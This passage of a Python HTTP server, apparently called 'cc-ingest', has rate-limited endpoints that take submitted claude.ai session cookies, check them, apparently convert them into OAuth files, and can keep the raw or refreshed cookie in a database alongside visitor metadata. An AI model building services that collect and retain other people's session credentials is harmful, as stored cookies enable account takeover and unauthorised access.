            event_id = insert_event(conn, row, output)
            conn.commit()
        finally:
            conn.close()
        if output:
            schedule_convert_check(event_id, output, ip, tz, ip_country)

    def api_check(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if not check_limiter.allow(ip):
            return self._rate_limited(check_limiter, ip)
        data = self._read_json()
        if data is None:
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        return self._check_payload(data, ip, ua, path="/api/v1/check")

    def api_credential(self):
        ip = self._client_ip()
        ua = self.headers.get("User-Agent", "")
        if not credential_ip_minute.allow(ip):
            return self._rate_limited(credential_ip_minute, ip)
        if not credential_ip_hour.allow(ip):
            return self._rate_limited(credential_ip_hour, ip)
        data = self._read_json()
        if data is None:
            return self._json(400, {"ok": False, "invalidReason": "empty"})
        return self._credential_payload(data, ip, ua, path="/api/v1/credential")

    def _store_credential(
        self,
        ip: str,
        ua: str,
        locale: str | None,
        result: dict,
        raw: str,
        *,
        valid: bool,
        reason: str | None,
        path: str = "/credential",
    ) -> None:
        country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
        row = {
            "ts": now(), "day": today(), "type": "credential",
            "visitor": visitor_hash(ip, ua), "country": country, "locale": locale,
            "device": device_class(ua), "path": path, "from_fmt": None,
            "to_fmt": None, "n": 1, "domains": "claude.ai",
            "valid": 1 if valid else 0,
            "reason": None if valid else (reason or "convert_failed"),
            "info": json.dumps(check_info(result), ensure_ascii=False) if result.get("ok") else None,
        }
        # Cookie only — never the minted OAuth file.
        stored = (result.get("freshCookie") or raw) if STORE_OUTPUT else None
        conn = db()
        try:
            insert_event(conn, row, stored)
            conn.commit()
        finally:
            conn.close()


def main():
    init_db()
    box_private()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    server.daemon_threads = True
    print(f"cc-ingest listening on {HOST}:{PORT}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    main()
